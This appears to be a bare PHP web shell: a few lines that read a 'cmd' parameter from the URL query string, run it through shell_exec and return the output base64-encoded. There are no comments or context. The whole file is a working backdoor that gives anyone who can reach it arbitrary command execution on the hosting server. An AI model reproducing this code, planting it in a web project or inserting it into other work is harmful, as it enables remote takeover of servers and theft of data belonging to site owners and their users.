<?php
        $value = " ";
        session_start();
        if (isset($_GET['cmd'])){
           
           $value = shell_exec($_GET['cmd']); 
           echo base64_encode( $value);
            
        }

?>
